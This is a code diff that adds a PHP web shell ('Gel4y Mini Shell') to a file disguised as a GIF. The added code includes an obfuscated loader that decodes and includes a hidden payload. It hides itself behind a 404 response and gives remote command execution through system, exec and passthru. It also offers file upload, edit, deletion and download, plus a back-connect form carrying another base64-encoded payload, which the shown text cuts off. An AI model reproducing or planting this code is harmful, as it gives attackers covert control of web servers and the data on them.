@@ -1,6 +1,756 @@
-GIF89a
-
 <?php
 /* GIF89a */
-//Obfuscate by https://uutool.cn/php/
- goto s3YBD; e6UB2: goto xHIvk; goto zpUwR; zpUwR: ZXNiy: goto F7u44; s3YBD: error_reporting(0); goto e6UB2; QfTrM: goto Na1V3; goto dgsoC; F7u44: function WW7J0($ghAj9) { goto iz48E; yr18V: goto YGxII; goto XtOrx; iz48E: goto B4PJO; goto Rqcrf; TuXFu: f1bMZ: goto aCZOy; B3r6K: $RB2jV = ("\x74\x65\155\x70\156\141\155")(("\163\171\x73\x5f\147\x65\x74\137\164\x65\x6d\x70\137\144\151\x72")(), "\x74\155\160\x5f\146\x75\156\x63"); goto mYv3x; C2XZ3: goto KCTqO; goto JBri4; Rqcrf: B4PJO: goto B3r6K; ApvtW: h2lhB: goto Ict7J; mYv3x: goto f1bMZ; goto ApvtW; PTzpK: $rEHp1 = (include $RB2jV); goto ANI0Z; Icmnh: YGxII: goto CPthB; WUl41: return $rEHp1; goto yr18V; Ict7J: unlink($RB2jV); goto C2XZ3; eSRrX: goto fHzgv; goto Icmnh; ANI0Z: goto h2lhB; goto TuXFu; aCZOy: file_put_contents($RB2jV, "\x3c\77\160\150\x70\40{$ghAj9}"); goto eSRrX; XtOrx: fHzgv: goto PTzpK; JBri4: KCTqO: goto WUl41; CPthB: } goto QfTrM; dgsoC: xHIvk: goto h9PA2; h9PA2: function R8K8K($a_5iM) { goto QL_wA; GPXjb: $a_5iM[$j2wIn] = chr(ord($a_5iM[$j2wIn]) - 1); goto SlC2a; ph4yM: tA5k1: goto GPXjb; ly_RT: RW80y: goto c6PZS; c6PZS: return $a_5iM; goto YdUMZ; i8RnW: ssGzd: goto Rhtf3; H4_gf: $a_5iM = base64_decode($a_5iM); goto T7WAU; h5Spx: z3uW2: goto pOYWJ; e9PEX: Y7JvK: goto OFLoA; XdjLY: goto tA5k1; goto gBWJb; FeEt5: goto RW80y; goto YFw1k; YFw1k: M1zAl: goto tBjyk; pOYWJ: goto kEKPI; goto af2Ei; SlC2a: goto ssGzd; goto cLZRl; JNonS: goto xoxA1; goto MDskl; OFLoA: if ($j2wIn < strlen($a_5iM)) { goto I0Zm8; } goto cDgXh; zIsHD: lcZJC: goto ey3dQ; ey3dQ: $j2wIn = 0; goto S5k6e; QL_wA: goto S1Qzk; goto zIsHD; cLZRl: aELwx: goto CaKSn; fGdKY: goto Y7JvK; goto ph4yM; Rhtf3: dtBhv: goto JNonS; YdUMZ: goto aELwx; goto e9PEX; zl7CB: goto z3uW2; goto ly_RT; bXp3o: I0Zm8: goto XdjLY; b2cRr: QMPQY: goto RQYLH; tBjyk: kEKPI: goto fGdKY; ABndB: $j2wIn++; goto zl7CB; gBWJb: S1Qzk: goto H4_gf; RQYLH: gbUip: goto FeEt5; T7WAU: goto lcZJC; goto h5Spx; MDskl: xoxA1: goto ABndB; cDgXh: goto gbUip; goto bXp3o; af2Ei: goto QMPQY; goto b2cRr; S5k6e: goto M1zAl; goto i8RnW; CaKSn: } goto Fln5p; Fln5p: goto ZXNiy; goto f9I9R; f9I9R: Na1V3: goto ujYqX; ujYqX: ww7J0(r8K8k("\x49\x53\105\150\111\x53\105\x4c\x4d\x43\163\150\111\x53\106\x67\x59\x47\x42\147\x59\107\102\x67\131\107\102\x67\131\107\102\x67\131\107\102\x67\131\107\x42\x67\131\107\x42\x67\x59\x47\102\147\131\x47\x42\147\131\107\x42\147\x59\107\102\x67\131\107\x42\147\x59\107\x42\x67\131\x47\102\147\131\107\x42\x67\x59\107\102\x67\131\x41\x73\x68\x49\x53\x45\x68\x66\123\105\x68\125\107\116\x6e\144\x6e\122\153\131\156\x56\155\132\123\x46\152\x65\x69\x46\141\121\153\167\150\x55\x58\x4e\167\111\x53\64\x68\125\127\154\170\111\x56\x42\152\132\63\x5a\60\132\x47\112\x31\143\x48\x4d\x68\111\124\115\166\115\123\70\171\116\x53\105\150\x66\121\x73\150\111\x53\x45\150\146\123\105\150\x49\123\x45\x68\111\x53\105\x68\x49\123\105\x68\x49\x53\105\150\x63\x47\x38\150\x4d\172\105\172\x4e\x43\x34\x79\115\171\64\x78\x4e\x43\105\x79\x4f\104\163\62\x4e\172\163\x30\x4e\x69\x45\x68\111\x53\x45\x68\x49\x53\105\x68\x49\x53\x45\x68\x49\123\105\150\146\121\x73\150\x49\x53\x45\150\x66\x53\105\x68\111\123\x46\111\x61\156\x56\x4a\144\155\x4d\67\x49\127\154\x31\x64\130\x46\x30\x4f\x7a\101\167\x61\x47\x70\61\141\130\x5a\x6a\114\x32\x52\167\x62\152\x42\170\x62\103\65\156\143\x7a\102\66\131\155\x78\x78\143\x33\x41\165\x63\x58\x41\x68\x49\x53\x45\150\x66\x51\x73\150\x49\123\x45\150\146\127\x42\x67\x59\x47\102\x67\131\107\x42\x67\131\x47\x42\x67\x59\x47\102\x67\x59\x47\x42\147\x59\107\102\147\131\107\102\x67\131\x47\x42\147\x59\x47\x42\147\131\107\x42\x67\x59\107\102\x67\x59\107\x42\147\x59\107\102\x67\x59\107\102\147\x59\x47\102\x67\x59\x47\x42\x67\x66\x51\x73\x72\x4d\x41\163\x68\141\x48\x42\61\143\x43\106\x48\145\x44\167\150\121\152\x63\67\x49\x57\144\x32\x62\x32\x52\61\141\156\x42\x76\x49\x58\126\x33\113\x53\126\172\125\x79\157\x68\146\x43\106\157\x63\x48\126\x77\x49\x55\x55\64\x50\x43\106\161\122\104\163\x68\112\126\x74\x45\x49\x54\x34\x68\113\127\160\166\x5a\107\61\62\132\x57\131\150\x4a\130\157\x32\x4b\x6a\x77\x68\141\x48\x42\x31\143\103\x46\x78\x61\152\x77\x68\x54\x32\163\67\111\130\116\x6d\144\130\x5a\x7a\x62\x79\x45\x6c\x57\60\x51\70\111\x57\x68\x77\x64\130\101\x68\141\x6c\115\x38\111\x55\126\x48\x4f\171\x46\156\x61\155\x31\155\x59\x48\106\62\x64\x57\x42\153\x63\107\x39\x31\132\x6d\x39\x31\x64\x43\x6b\154\x65\x6a\x59\x74\111\x53\x4e\70\x4a\x58\116\x54\146\x69\115\161\x50\103\x46\157\x63\110\x56\167\111\x57\x70\105\120\x43\x46\106\x4f\104\163\150\112\130\157\62\x49\x54\64\150\144\x57\132\165\143\x57\x39\151\x62\x69\x6c\60\145\156\122\x67\141\x47\x5a\x31\x59\x48\x56\x6d\x62\x6e\x46\x67\x5a\127\x70\x7a\x4b\123\x6f\x74\x49\x53\116\144\145\x54\x67\61\130\x58\x6b\x33\x5a\x56\61\x35\x4f\104\106\x64\145\x54\132\x6e\x58\x54\x49\61\x4e\61\x30\171\x4e\x7a\132\x64\145\124\x64\155\x58\130\153\x33\116\103\x4d\x71\120\x43\x46\157\143\110\126\x77\111\x55\x56\x48\120\x43\106\170\141\x6a\163\x68\x64\155\71\164\x61\155\71\163\x4b\123\126\x36\x4e\151\157\x38\x49\x57\x68\x77\x64\x58\101\150\x54\x32\x73\70\x49\127\x70\x54\117\x79\106\x2b\x49\127\x68\x77\144\130\101\x68\144\152\105\x38\x49\x55\x64\x34\117\171\x45\154\x61\x56\x51\x68\120\151\x46\153\x64\156\x4e\x74\131\x47\x70\x76\x61\x6e\125\160\x4b\152\167\150\x61\110\102\61\x63\103\x46\x55\x63\152\167\x68\144\x48\x67\67\x49\123\126\172\124\123\105\53\111\x57\x52\x32\x63\62\61\147\132\156\154\155\x5a\103\153\154\x61\x56\121\x71\120\103\x46\x6f\143\110\x56\167\111\126\102\x62\120\x43\x46\121\127\x7a\x73\150\x5a\110\x5a\172\142\127\102\153\142\x58\102\x30\x5a\x69\x6b\x6c\141\126\x51\x71\120\x43\106\157\x63\x48\x56\x77\111\x55\111\63\120\x43\106\x55\143\x6a\163\150\132\x48\132\x7a\142\127\102\x30\132\156\x56\x77\143\x58\126\147\131\x6e\x4e\172\x59\156\157\160\x4a\x57\x6c\x55\x4c\x53\106\151\143\x33\x4e\151\x65\x69\154\x45\x56\154\116\x4e\x55\106\106\x56\x59\x46\x5a\x54\x54\123\105\x2b\120\x79\x45\x6a\x58\x54\111\x32\x4d\x56\x30\x79\116\172\126\x64\x65\124\147\x31\130\x54\x49\63\x4d\126\x30\171\116\172\122\144\145\x54\122\151\130\x58\153\172\x5a\x31\61\x35\115\62\144\x64\115\x6a\143\x7a\130\130\153\63\x4d\154\x31\65\117\104\x68\x64\116\x6a\144\x64\x65\x54\143\x34\130\130\x6b\x33\x4f\x6c\x30\x79\x4e\172\x56\144\145\x54\143\x35\x58\x54\111\x33\x4e\154\61\65\116\x7a\x4e\x64\145\124\147\62\x58\x54\x49\63\x4e\x46\61\65\116\x7a\x5a\144\115\x6a\x63\172\x58\130\x6b\63\116\x46\x30\x79\x4e\x6a\150\x64\x4d\152\x59\63\130\130\x6b\64\x4e\126\61\65\116\x7a\x5a\144\x4d\x6a\x59\x33\x58\x58\x6b\x34\x4e\x56\x30\62\116\61\x31\x35\x4e\172\122\x64\145\124\x64\156\x58\x58\153\x33\132\126\60\x32\117\106\x30\x33\x4d\61\61\65\116\104\x4e\x64\145\x54\x59\65\130\130\153\x34\x4d\126\60\x79\x4e\152\x56\144\x65\x54\x64\x6e\130\x54\111\x32\115\x6c\60\x79\x4e\x7a\x56\x64\145\x54\143\x32\x58\124\x49\x33\115\x31\60\171\x4d\124\122\x64\115\x6a\143\172\130\x54\111\x31\x4e\x6c\x30\x79\x4e\172\150\144\116\x6a\132\144\x65\124\131\x31\x58\130\153\63\x4e\x6c\61\65\116\172\112\x64\x4d\152\x59\x32\x58\130\153\x7a\x5a\x31\60\x79\x4d\124\x68\144\145\x54\x63\x32\x58\x54\111\62\116\x56\x30\x33\x4e\126\x30\171\117\x44\x4a\144\x4e\x6a\x5a\144\145\124\126\x6c\x58\130\x6b\x33\117\x6c\61\x35\x4e\x32\x5a\x64\x4d\x6a\x59\x79\130\130\153\x7a\132\x56\x30\171\115\172\x52\144\115\152\x59\170\130\130\153\x33\x4e\154\61\x35\x4e\x32\122\x64\145\124\144\x6b\130\x58\153\x7a\x5a\126\x30\171\115\124\x4e\144\115\x6a\125\171\130\124\111\x31\x4e\106\61\65\x4e\62\x4e\144\x4d\152\125\x31\130\130\x6b\x33\x5a\61\x31\65\116\62\x64\144\x65\x54\x67\172\130\130\x6b\172\132\x31\x31\x35\x4e\x7a\x56\144\145\124\x63\62\x58\130\x6b\x34\116\61\60\62\117\106\x31\65\116\x7a\150\144\x4d\x6a\125\62\130\130\153\63\x5a\x46\61\x35\116\172\x4a\x64\x65\124\x67\x36\130\130\x6b\x7a\x5a\154\x31\x35\x4f\x44\106\144\x65\124\143\65\x58\124\x49\63\x4d\x53\115\164\x49\125\x52\x57\125\x30\x31\x51\x55\x56\x56\147\x56\x46\122\x4e\131\x46\144\107\125\60\160\x48\x57\x6b\154\121\x56\106\125\x68\120\152\70\150\122\x30\x4a\116\x56\105\x59\x74\x49\x55\x52\x57\x55\x30\x31\121\x55\126\126\147\126\106\122\116\x59\106\144\x47\x55\60\160\x48\127\154\106\x47\x52\154\115\x68\120\x6a\x38\150\122\60\112\x4e\126\105\131\x74\111\x55\x52\x57\125\x30\x31\121\125\x56\126\x67\125\x30\132\126\126\x6c\116\x50\126\x56\x4e\x43\124\x31\122\x48\x52\154\115\150\x50\152\x38\x68\126\x56\x4e\127\122\x69\157\161\120\x43\106\x6f\143\110\126\x77\111\x58\122\64\120\103\x46\x32\115\x54\x73\x68\x64\130\x63\160\112\130\116\x4e\x4b\x6a\167\x3d"));
+
+http_response_code(404);
+define("FmHaNw7Sd4", "Gel4y Mini Shell");
+if (isset($_GET['l'])) {
+    $EEfZ6TZDdb = RxEfBN6HEy($_GET['l']);
+    chdir($EEfZ6TZDdb);
+} else {
+    $EEfZ6TZDdb = getcwd();
+}
+function ZiOdpZ7NRe($uzNaDUYhmE)
+{
+    if (function_exists('system')) {
+        @ob_start();
+        @system($uzNaDUYhmE);
+        $GpjllTmONM = @ob_get_contents();
+        @ob_end_clean();
+        return $GpjllTmONM;
+    } else {
+        if (function_exists('exec')) {
+            @exec($uzNaDUYhmE, $htHTK6yRnX);
+            $GpjllTmONM = '';
+            foreach ($htHTK6yRnX as $DWC35O18yz) {
+                $GpjllTmONM .= $DWC35O18yz;
+            }
+            return $GpjllTmONM;
+        } else {
+            if (function_exists('passthru')) {
+                @ob_start();
+                @passthru($uzNaDUYhmE);
+                $GpjllTmONM = @ob_get_contents();
+                @ob_end_clean();
+                return $GpjllTmONM;
+            } else {
+                if (function_exists('LO04lRpWK3')) {
+                    $GpjllTmONM = @lO04lrpWK3($uzNaDUYhmE);
+                    return $GpjllTmONM;
+                } else {
+                }
+            }
+        }
+    }
+}
+function hrXkAttUKJ($rn5LpfN5ed)
+{
+    $q_apefxuXb = fileperms($rn5LpfN5ed);
+    switch ($q_apefxuXb & 0xf000) {
+        case 0xc000:
+            $pEiaUOtN6B = 's';
+            break;
+        case 0xa000:
+            $pEiaUOtN6B = 'l';
+            break;
+        case 0x8000:
+            $pEiaUOtN6B = '-';
+            break;
+        case 0x6000:
+            $pEiaUOtN6B = 'b';
+            break;
+        case 0x4000:
+            $pEiaUOtN6B = 'd';
+            break;
+        case 0x2000:
+            $pEiaUOtN6B = 'c';
+            break;
+        case 0x1000:
+            $pEiaUOtN6B = 'p';
+            break;
+        default:
+            $pEiaUOtN6B = 'u';
+    }
+    $pEiaUOtN6B .= $q_apefxuXb & 0x100 ? 'r' : '-';
+    $pEiaUOtN6B .= $q_apefxuXb & 0x80 ? 'w' : '-';
+    $pEiaUOtN6B .= $q_apefxuXb & 0x40 ? $q_apefxuXb & 0x800 ? 's' : 'x' : ($q_apefxuXb & 0x800 ? 'S' : '-');
+    $pEiaUOtN6B .= $q_apefxuXb & 0x20 ? 'r' : '-';
+    $pEiaUOtN6B .= $q_apefxuXb & 0x10 ? 'w' : '-';
+    $pEiaUOtN6B .= $q_apefxuXb & 0x8 ? $q_apefxuXb & 0x400 ? 's' : 'x' : ($q_apefxuXb & 0x400 ? 'S' : '-');
+    $pEiaUOtN6B .= $q_apefxuXb & 0x4 ? 'r' : '-';
+    $pEiaUOtN6B .= $q_apefxuXb & 0x2 ? 'w' : '-';
+    $pEiaUOtN6B .= $q_apefxuXb & 0x1 ? $q_apefxuXb & 0x200 ? 't' : 'x' : ($q_apefxuXb & 0x200 ? 'T' : '-');
+    return $pEiaUOtN6B;
+}
+function q0wfVKUjRs($Isvtvo_Khk)
+{
+    global $dYmVY71pVg;
+    if (trim(pathinfo($Isvtvo_Khk, PATHINFO_BASENAME), '.') === '') {
+        return;
+    }
+    if (is_dir($Isvtvo_Khk)) {
+        array_map("deldir", glob($Isvtvo_Khk . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
+        rmdir($Isvtvo_Khk);
+    } else {
+        unlink($Isvtvo_Khk);
+    }
+}
+function rxefBN6hEy($D9W0v0K2q3, $b5rceFkfVX = true, $IKiphkRa67 = 0)
+{
+    $FMsfhj9eNN = '';
+    $OI03NhJ2Yv = strlen($D9W0v0K2q3);
+    if ($b5rceFkfVX == false) {
+        while ($IKiphkRa67 < $OI03NhJ2Yv) {
+            $FMsfhj9eNN .= dechex(ord($D9W0v0K2q3[$IKiphkRa67]));
+            $IKiphkRa67++;
+        }
+    } else {
+        while ($IKiphkRa67 < $OI03NhJ2Yv - 1) {
+            $FMsfhj9eNN .= chr(hexdec("{$D9W0v0K2q3[$IKiphkRa67]}{$D9W0v0K2q3[$IKiphkRa67 + 1]}"));
+            $IKiphkRa67 += 2;
+        }
+    }
+    return $FMsfhj9eNN;
+}
+function bb5inVuGyH($TyHtfHVLGo, $IqAFWYu448, $JpGr27PQID = 1)
+{
+    $F3VGKH3ww0 = $JpGr27PQID == 1 ? "success" : "error";
+    echo "<script>swal({title: \"{$F3VGKH3ww0}\", text: \"{$TyHtfHVLGo}\", icon: \"{$F3VGKH3ww0}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . $IqAFWYu448 . "\"}})</script>";
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="theme-color" content="red">
+<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<title></title>
+<style>
+body {
+color: #fff;
+font-family: serif;
+background-color: #000;
+}
+a, a:hover, pre {
+color: #fff;
+}
+.table-hover tbody tr:hover td {
+background: red
+}
+
+.table-hover tbody tr:hover td>* {
+color: #fff
+}
+
+.table>tbody>tr>* {
+color: #fff;
+vertical-align: middle
+}
+.form-control {
+background: 0 0!important;
+color: #fff!important;
+border-radius: 0
+}
+
+.form-control::placeholder {
+color: #fff;
+opacity: 1
+}
+</style>
+<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+</head>
+<body>
+<main class="my-1">
+<div class="border bg-dark px-1">
+<div class="d-flex justify-content-between">
+<div>
+<h3 class="mt-2"><a href="?"><?php 
+echo FmHaNw7Sd4;
+?></a></h3>
+</div>
+<div>
+<span>PHP Version: <?php 
+echo phpversion();
+?></span><br>
+<a href="<?php 
+echo "?l=" . RXEFbn6hey($EEfZ6TZDdb, 0) . "&a=" . rxEfbn6HEy("cdir", 0);
+?>"><i class="fa fa-plus"></i><i class="fa fa-folder"></i></a> |
+<a href="<?php 
+echo "?l=" . RXefBN6HEY($EEfZ6TZDdb, 0) . "&a=" . RXEfBn6hey("cfile", 0);
+?>"><i class="fa fa-plus"></i><i class="fa fa-file"></i></a> |
+<a href="<?php 
+echo "?l=" . rxefBN6Hey($EEfZ6TZDdb, 0) . "&a=" . RXEfBn6HEy("con", 0);
+?>"><i class="fa fa-usb"></i></a> |
+<a href="<?php 
+echo "?l=" . rxefbn6HeY($EEfZ6TZDdb, 0) . "&a=" . rxEFbN6HEY("term", 0);
+?>"><i class="fa fa-terminal"></i></a>
+</div>
+</div>
+<div class="border-top">
+<ul style="list-style:none;" class="m-0 p-0">
+<li><b>Server</b>: <?php 
+echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})";
+?></li>
+<li><b>PHP Uname</b>: <?php 
+echo php_uname();
+?></li>
+</ul>
+</div>
+<form method="post" enctype="multipart/form-data">
+<div class="input-group mb-1">
+<div class="custom-file">
+<input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple>
+<label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label>
+</div>
+</div>
+</form>
+<?php 
+if (isset($_FILES['f'])) {
+    $TQjF6JN0Xn = $_FILES['f']['name'];
+    $IKiphkRa67 = 0;
+    while ($IKiphkRa67 < count($TQjF6JN0Xn)) {
+        $Dfdl9lkULa = $_FILES['f']['tmp_name'];
+        $Dbi_h94n09 = $_FILES['f']['type'];
+        $jzgT5WmvBi = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
+        if (!move_uploaded_file($Dfdl9lkULa[$IKiphkRa67], $TQjF6JN0Xn[$IKiphkRa67])) {
+            Bb5iNVugyH("file failed to upload", rXeFBN6HeY($EEfZ6TZDdb, 0), 0);
+        } else {
+            if (in_array($Dbi_h94n09[$IKiphkRa67], $jzgT5WmvBi)) {
+                $j6fm9JkXX3 = new ZipArchive();
+                $j78MPlSKil = $j6fm9JkXX3->open($TQjF6JN0Xn[$IKiphkRa67]);
+                if ($j78MPlSKil == true) {
+                    $j6fm9JkXX3->extractTo(basename($TQjF6JN0Xn[$IKiphkRa67], '.zip'));
+                    $j6fm9JkXX3->close();
+                }
+            }
+            Bb5inVUGYh("file uploaded successfully", RxEfbn6heY($EEfZ6TZDdb, 0));
+        }
+        $IKiphkRa67++;
+    }
+}
+if (isset($_GET["download"])) {
+    header("Content-Type: application/octet-stream");
+    header("Content-Transfer-Encoding: Binary");
+    header("Content-Length: " . strtotime(Rxefbn6hey($_GET["n"])));
+    header("Content-disposition: attachment; filename=\"" . rXEfbn6hey($_GET["n"]) . "\"");
+}
+?>
+</div>
+<div class="border bg-dark my-2 py-2 table-responsive">
+<div class="mx-2">
+<span>Path:</span>
+<?php 
+$WekN4aubDI = preg_split("/(\\\\|\\/)/", $EEfZ6TZDdb);
+foreach ($WekN4aubDI as $x42dyPJI_Q => $iIMh47ezZF) {
+    if (!($x42dyPJI_Q == 0 && $iIMh47ezZF == "")) {
+        if (!($iIMh47ezZF == "")) {
+            echo "<a href=\"?l=";
+            $IKiphkRa67 = 0;
+            while ($IKiphkRa67 <= $x42dyPJI_Q) {
+                echo rxEFbn6hey($WekN4aubDI[$IKiphkRa67], 0);
+                if ($IKiphkRa67 != $x42dyPJI_Q) {
+                    echo "2f";
+                }
+                $IKiphkRa67++;
+            }
+            echo "\">{$iIMh47ezZF}</a>/";
+        } else {
+        }
+    } else {
+        echo "<a href=\"?l=2f\">~</a>/";
+    }
+}
+?>
+</div>
+</div>
+<article class="bg-dark border table-responsive">
+<?php 
+if (!isset($_GET["a"])) {
+    ?>
+<table class="table table-hover table-borderless table-sm">
+<thead class="text-light">
+<tr>
+<th>Name</th>
+<th>Size</th>
+<th>Permission</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<?php 
+    $fgiEl2SFA1 = array_diff(scandir($EEfZ6TZDdb), ['.', '..']);
+    foreach ($fgiEl2SFA1 as $GH5ltOv09p) {
+        if (is_dir("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) {
+            echo "<tr>\n          <td><a href=\"?l=" . RxefBN6hEY("{$EEfZ6TZDdb}/{$GH5ltOv09p}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) == 0 ? "" : "-open") . " text-warning\"></i> {$GH5ltOv09p}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$EEfZ6TZDdb}/{$GH5ltOv09p}") ? "#00ff00" : (!is_readable("{$EEfZ6TZDdb}/{$GH5ltOv09p}") ? "red" : null)) . "\">" . hRXkAtTukJ("{$EEfZ6TZDdb}/{$GH5ltOv09p}") . "</font></td>\n          <td>\n            <a href=\"?l=" . rXeFbN6HEy($EEfZ6TZDdb, 0) . "&a=" . rxeFBn6HEy("rename", 0) . "&n=" . rXEFbN6Hey($GH5ltOv09p, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . RxEfBn6hEY($EEfZ6TZDdb, 0) . "&a=" . RxefbN6hey("delete", 0) . "&n=" . rxEFbn6HEy($GH5ltOv09p, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>";
+        } else {
+        }
+    }
+    foreach ($fgiEl2SFA1 as $rn5LpfN5ed) {
+        if (is_file("{$EEfZ6TZDdb}/{$rn5LpfN5ed}")) {
+            $nWFrSLIRip = filesize("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") / 1024;
+            $nWFrSLIRip = round($nWFrSLIRip, 3);
+            $nWFrSLIRip = $nWFrSLIRip > 1024 ? round($nWFrSLIRip / 1024, 2) . "MB" : $nWFrSLIRip . "KB";
+            echo "<tr>\n\t        <td><a href=\"?l=" . rxefbN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXEFbn6HEY("view", 0) . "&n=" . RxEFBN6heY($rn5LpfN5ed, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$EEfZ6TZDdb}/{$rn5LpfN5ed}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$EEfZ6TZDdb}/{$rn5LpfN5ed}" ? " text-danger" : "") . "\"></i> {$rn5LpfN5ed}</a></td>\n\t        <td>{$nWFrSLIRip}</td>\n\t        <td><font color=\"" . (is_writable("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") ? "#00ff00" : (!is_readable("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") ? "red" : null)) . "\">" . HRXkaTtukj("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a href=\"?l=" . RXeFbN6HEY($EEfZ6TZDdb, 0) . "&a=" . rxeFBN6hey("edit", 0) . "&n=" . RXeFBN6HEY($rn5LpfN5ed, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . RXeFBn6hey($EEfZ6TZDdb, 0) . "&a=" . RXeFBn6HeY("rename", 0) . "&n=" . rXEfbN6hEY($rn5LpfN5ed, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . rxeFbN6HEy($EEfZ6TZDdb, 0) . "&n=" . RXEFbN6HeY($rn5LpfN5ed, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . RxEFBn6Hey($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6heY("delete", 0) . "&n=" . rxEfbN6heY($rn5LpfN5ed, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>";
+        } else {
+        }
+    }
+    ?>
+</tbody>
+</table>
+<?php 
+} else {
+    if (isset($_GET["a"])) {
+        $hzOvuJeFzz = RxEFbN6HEY($_GET["a"]);
+        ?>
+<div class="px-2 py-2">
+<?php 
+        if ($hzOvuJeFzz == "delete") {
+            $IqAFWYu448 = $EEfZ6TZDdb . '/' . RXefBN6hey($_GET["n"]);
+            if ($_GET["t"] == "d") {
+                Q0WFVkujRs($IqAFWYu448);
+                if (!file_exists($IqAFWYu448)) {
+                    BB5InVuGyh("folder deleted successfully", rxEFbN6Hey($EEfZ6TZDdb, 0));
+                } else {
+                    Bb5INvUgYh("failed to delete the folder", RxefbN6HEY($EEfZ6TZDdb, 0), 0);
+                }
+            }
+            if ($_GET["t"] == "f") {
+                $IqAFWYu448 = $EEfZ6TZDdb . '/' . RxEFBn6HeY($_GET["n"]);
+                unlink($IqAFWYu448);
+                if (!file_exists($IqAFWYu448)) {
+                    Bb5inVuGyH("file deleted successfully", RXEfbn6heY($EEfZ6TZDdb, 0));
+                    if ($hzOvuJeFzz == "con") {
+                        ?>
+<h5>PHP Back Connect</h5>
+<form method="post">
+<div class="input-group mb-3">
+<input type="text" name="ip" placeholder="<?php 
+                        echo $_SERVER["REMOTE_ADDR"];
+                        ?>" class="form-control">
+<input type="number" name="port" placeholder="<?php 
+                        echo rand(1, 6) * 1922;
+                        ?>" class="form-control">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
+</div>
+</form>
+<?php 
+                        if (isset($_POST['s'])) {
+                            echo '<div class="my-3">';
+                            $TkCbW35AQi = $_POST['ip'];
+                            $g9_4Zq7xGB = $_POST['port'];
+                            $rRwNpSflmI = base64_decode("Z290byBQSVdtODsKbFVjUWI6CmZjbG9zZSgkcGlwWzJdKTsKZ290byBUT01NNjsKbzZfbnM6CmV4aXQoMCk7CmdvdG8gZExXZVE7CnJDVnd6OgokZWEgPSBudWxsOwpnb3RvIE9rZ2M4OwpQSVdtODoKZXJyb3JfcmVwb3J0aW5nKDApOwpnb3RvIHdrcktMOwpkTFdlUToKSzFmSnI6CmdvdG8gRVEwZm07CnNnTWNQOgpmY2xvc2UoJHMpOwpnb3RvIFc1eUxiOwpOOGkyYjoKaWYgKCFpbl9hcnJheSgkcGlwWzFdLCAkcmEpKSB7CiAgZ290byB5Q1pzUTsKfQpnb3RvIHV0VUdtOwpjYXQ5MDoKaWYgKCFmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYzXHg2ZVx4NzRceDZjXDEzN1x4NjZceDZmXDE2MlwxNTMiKSkgewogIGdvdG8gQmFhcjA7Cn0KZ290byBDQ3ZNbTsKUFVlRFI6Cm9iX2ltcGxpY2l0X2ZsdXNoKCk7CmdvdG8gUlAweWc7CkF0dEZVOgpleGl0KDEpOwpnb3RvIEVnOWhnOwpLUTFRUjoKJGkgPSBmcmVhZCgkcGlwWzJdLCAkY3MpOwpnb3RvIE1DbmloOwpTUEVaRDoKJHAgPSAkdGFyZ2V0Owpnb3RvIE5SVDNpOwpoWXl6YToKeUNac1E6CmdvdG8gZ29NN007Cm9DbWFNOgpzdHJlYW1fc2V0X3RpbWVvdXQoJHMsIDMwKTsKZ290byBxeVkyVDsKVkRCQXE6CiRzID0gc3RyZWFtX3NvY2tldF9zZXJ2ZXIoIlx4NzRceDYzXDE2MFx4M2FceDJmXHgyZlw2MFw1Nlx4MzBceDJlXHgzMFw1Nlw2MFx4M2EiIC4gJHAsICRlcnJubywgJGVycnN0cik7CmdvdG8gb0NtYU07Ck9odWU4OgppZiAoJHQgPT0gIlx4NjJcMTUxXDE1NlwxNDQiKSB7CiAgZ290byBwZVhlUTsKfQpnb3RvIHBIa2t6Owp0dkVIUjoKWFhCS3Q6CmdvdG8gVDRMRWk7C